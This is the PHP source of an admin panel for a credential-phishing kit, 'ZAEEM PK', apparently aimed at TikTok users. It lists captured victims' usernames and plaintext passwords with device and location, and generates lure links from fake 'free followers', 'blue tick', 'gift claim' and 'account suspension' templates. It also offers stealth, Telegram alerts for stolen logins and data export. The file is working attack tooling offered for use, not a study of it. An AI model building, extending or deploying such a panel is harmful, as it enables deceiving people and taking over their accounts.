<?php
session_start();
require_once '../includes/config.php';
require_once '../includes/functions.php';
require_once '../includes/db.php';

if (!isAdmin()) {
    redirect('login.php');
}

$db = Database::getInstance();
$victims = $db->getAll('victims');
$victimCount = $db->getCount('victims');

$countries = [];
foreach ($victims as $v) {
    if (!empty($v['country'])) {
        $countries[] = $v['country'];
    }
}
$uniqueCountries = count(array_unique($countries));
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZAEEM PK — Admin Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0A0A0A;
            color: #fff;
            font-family: 'Segoe UI', Arial, sans-serif;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        .header {
            background: #141414;
            padding: 20px 30px;
            border-radius: 15px;
            border: 1px solid #FFD700;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
        }
        .zaeem-title {
            font-size: 28px;
            font-weight: 900;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .gold-text {
            background: linear-gradient(45deg, #FFD700, #FF6B00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle { color: #888; font-size: 13px; display: block; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .admin-badge {
            background: #1a1a2e;
            padding: 8px 16px;
            border-radius: 20px;
            border: 1px solid #2A2A4A;
            font-size: 13px;
            color: #888;
        }
        .admin-badge i { color: #25f4ee; margin-right: 5px; }
        .logout-btn {
            padding: 8px 16px;
            background: #FF2D55;
            border-radius: 20px;
            color: #fff;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }
        .logout-btn:hover { opacity: 0.8; }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: #141414;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            text-align: center;
        }
        .stat-card i { font-size: 28px; display: block; margin-bottom: 8px; }
        .stat-card i.icon-cyan { color: #00F5FF; }
        .stat-card i.icon-gold { color: #FFD700; }
        .stat-card i.icon-pink { color: #FF2D55; }
        .stat-card h3 { color: #888; font-size: 13px; }
        .stat-number { font-size: 30px; font-weight: 700; margin-top: 5px; }

        .generate-section {
            background: #141414;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            margin-bottom: 25px;
        }
        .generate-section h2 { font-size: 18px; color: #00F5FF; margin-bottom: 15px; }
        .generate-section h2 i { margin-right: 10px; }
        .generate-form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .generate-form select, .generate-form input {
            flex: 1;
            min-width: 150px;
            padding: 12px 16px;
            background: #0A0A0A;
            border: 1px solid #2A2A4A;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
        }
        .generate-form select:focus, .generate-form input:focus {
            outline: none;
            border-color: #00F5FF;
        }
        .btn-generate {
            padding: 12px 30px;
            background: linear-gradient(45deg, #00F5FF, #FF2D55);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
        }
        .btn-generate:hover { transform: scale(1.05); }
        .generated-link-box {
            margin-top: 15px;
            display: none;
            padding: 15px;
            background: #0A0A0A;
            border-radius: 8px;
            border: 1px solid #00F5FF;
        }
        .link-display { display: flex; gap: 10px; flex-wrap: wrap; }
        .link-display input {
            flex: 1;
            min-width: 200px;
            padding: 10px 14px;
            background: #000;
            border: none;
            color: #00F5FF;
            font-size: 13px;
            border-radius: 5px;
        }
        .btn-copy {
            padding: 10px 18px;
            background: #00F5FF;
            border: none;
            border-radius: 5px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
        }
        .btn-share {
            padding: 10px 18px;
            background: #FF2D55;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
        }

        .logs-section {
            background: #141414;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            margin-bottom: 25px;
            overflow-x: auto;
        }
        .logs-section h2 { font-size: 18px; color: #FF2D55; margin-bottom: 15px; }
        .logs-section h2 i { margin-right: 10px; }
        .logs-section h2 span { color: #888; font-size: 14px; font-weight: 400; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th {
            background: #0A0A0A;
            padding: 12px;
            text-align: left;
            color: #888;
            border-bottom: 2px solid #2A2A4A;
        }
        td { padding: 12px; border-bottom: 1px solid #1A1A2E; color: #ccc; }
        tr:hover { background: #0A0A0A; }
        .empty-state { text-align: center !important; color: #555 !important; padding: 40px !important; }
        .empty-state i { display: block; font-size: 30px; margin-bottom: 10px; }
        .badge-success {
            background: #00F5FF;
            color: #000;
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            display: inline-block;
        }
        .btn-delete {
            background: #FF2D55;
            border: none;
            border-radius: 5px;
            color: #fff;
            padding: 5px 10px;
            cursor: pointer;
        }
        .btn-delete:hover { opacity: 0.8; }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .feature-card {
            background: #141414;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            text-align: center;
        }
        .feature-card i { font-size: 28px; color: #00F5FF; display: block; margin-bottom: 8px; }
        .feature-card h4 { color: #FFD700; font-size: 15px; }
        .feature-card p { color: #888; font-size: 13px; margin-bottom: 10px; }
        .btn-feature {
            padding: 6px 18px;
            background: transparent;
            border: 1px solid #00F5FF;
            border-radius: 5px;
            color: #00F5FF;
            cursor: pointer;
        }
        .btn-feature:hover { background: #00F5FF; color: #000; }
        .btn-feature.small { padding: 4px 12px; font-size: 11px; }
        .btn-group { display: flex; gap: 5px; justify-content: center; }

        .footer {
            text-align: center;
            padding: 20px;
            color: #555;
            font-size: 13px;
            border-top: 1px solid #1A1A2E;
        }
        .footer i { color: #FF2D55; }

        @media (max-width: 600px) {
            .header { flex-direction: column; text-align: center; }
            .generate-form { flex-direction: column; }
            .link-display { flex-direction: column; }
            .link-display input { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div>
                <h1 class="zaeem-title">
                    <i class="fas fa-skull"></i>
                    <span class="gold-text">ZAEEM PK</span>
                    <span>🇵🇰</span>
                    <span>🙌🏻</span>
                </h1>
                <span class="subtitle">Admin Dashboard</span>
            </div>
            <div class="header-right">
                <span class="admin-badge"><i class="fas fa-user-shield"></i> admin_17</span>
                <a href="logout.php" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>
        </header>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <i class="fas fa-users icon-gold"></i>
                <h3>Total Records</h3>
                <p class="stat-number"><?php echo $victimCount; ?></p>
            </div>
            <div class="stat-card">
                <i class="fas fa-globe-asia icon-cyan"></i>
                <h3>Countries</h3>
                <p class="stat-number"><?php echo $uniqueCountries; ?></p>
            </div>
            <div class="stat-card">
                <i class="fas fa-bolt icon-pink"></i>
                <h3>Live Sessions</h3>
                <p class="stat-number" id="liveSessions">0</p>
            </div>
        </div>

        <!-- Generate -->
        <section class="generate-section">
            <h2><i class="fas fa-wand-magic-sparkles"></i> Generate Campaign</h2>
            <div class="generate-form">
                <select id="templateSelect">
                    <option value="followers">📈 Free Followers</option>
                    <option value="verify">✅ Blue Tick</option>
                    <option value="gift">🎁 Gift Claim</option>
                    <option value="suspension">⚠️ Suspension</option>
                </select>
                <input type="text" id="campaignName" placeholder="Campaign Name" value="Campaign_<?php echo rand(100,999); ?>">
                <button onclick="generateLink()" class="btn-generate"><i class="fas fa-link"></i> Generate Link</button>
            </div>
            <div class="generated-link-box" id="linkBox">
                <div class="link-display">
                    <input type="text" id="generatedLink" readonly>
                    <button onclick="copyLink()" class="btn-copy"><i class="fas fa-copy"></i></button>
                    <button onclick="shareLink()" class="btn-share"><i class="fas fa-share"></i></button>
                </div>
            </div>
        </section>

        <!-- Logs -->
        <section class="logs-section">
            <h2><i class="fas fa-list-skull"></i> Victim Logs <span>(<?php echo $victimCount; ?>)</span></h2>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Session</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Device</th>
                            <th>Location</th>
                            <th>Time</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($victims)): ?>
                        <tr><td colspan="8" class="empty-state"><i class="fas fa-eye-slash"></i> No records found</td></tr>
                        <?php else: ?>
                        <?php foreach ($victims as $index => $v): ?>
                        <tr>
                            <td><?php echo $index + 1; ?></td>
                            <td><strong><?php echo htmlspecialchars($v['session'] ?? 'N/A'); ?></strong></td>
                            <td><?php echo htmlspecialchars($v['username'] ?? 'unknown'); ?></td>
                            <td><?php echo htmlspecialchars($v['password'] ?? '---'); ?></td>
                            <td><?php echo htmlspecialchars($v['device'] ?? 'Unknown'); ?></td>
                            <td><?php echo htmlspecialchars($v['flag'] ?? '🌍') . ' ' . htmlspecialchars($v['location'] ?? 'Unknown'); ?></td>
                            <td><?php echo htmlspecialchars($v['time'] ?? 'Just now'); ?></td>
                            <td><span class="badge-success">✅ Active</span></td>
                        </tr>
                        <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>

        <!-- Features -->
        <div class="features-grid">
            <div class="feature-card">
                <i class="fas fa-shield-halved"></i>
                <h4>Stealth Mode</h4>
                <p>Undetectable layer</p>
                <label class="switch">
                    <input type="checkbox" id="stealthMode" checked>
                    <span style="display:inline-block; width:40px; height:20px; background:#2A2A4A; border-radius:20px; position:relative; cursor:pointer;">
                        <span style="display:inline-block; width:16px; height:16px; background:#fff; border-radius:50%; position:absolute; top:2px; left:2px; transition:0.3s;"></span>
                    </span>
                </label>
            </div>
            <div class="feature-card">
                <i class="fab fa-telegram"></i>
                <h4>Telegram Alerts</h4>
                <p>Instant notifications</p>
                <button onclick="setupTelegram()" class="btn-feature">Setup</button>
            </div>
            <div class="feature-card">
                <i class="fas fa-download"></i>
                <h4>Export Data</h4>
                <p>CSV / JSON</p>
                <div class="btn-group">
                    <button onclick="exportData('csv')" class="btn-feature small">CSV</button>
                    <button onclick="exportData('json')" class="btn-feature small">JSON</button>
                </div>
            </div>
        </div>

        <footer class="footer">
            <i class="fas fa-skull"></i> © 2026 <strong class="gold-text">ZAEEM PK 🇵🇰🙌🏻</strong>
        </footer>
    </div>

    <script>
        function generateLink() {
            const template = document.getElementById('templateSelect').value;
            const campaign = document.getElementById('campaignName').value;
            const ref = Math.random().toString(36).substring(2, 8).toUpperCase();
            const link = window.location.origin + '/pages/' + template + '.php?ref=' + ref + '&camp=' + encodeURIComponent(campaign);
            document.getElementById('generatedLink').value = link;
            document.getElementById('linkBox').style.display = 'block';
        }

        function copyLink() {
            const link = document.getElementById('generatedLink');
            link.select();
            document.execCommand('copy');
            alert('Link Copied!');
        }

        function shareLink() {
            const link = document.getElementById('generatedLink').value;
            if(navigator.share) {
                navigator.share({ title: 'TikTok Security', url: link });
            } else {
                prompt('Share this link:', link);
            }
        }

        function setupTelegram() {
            alert('Configure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in config.php');
        }

        function exportData(format) {
            alert('Export ' + format.toUpperCase() + ' - Check database records');
        }

        setInterval(() => {
            document.getElementById('liveSessions').innerHTML = Math.floor(Math.random() * 30) + 5;
        }, 3000);
    </script>
</body>
</html>
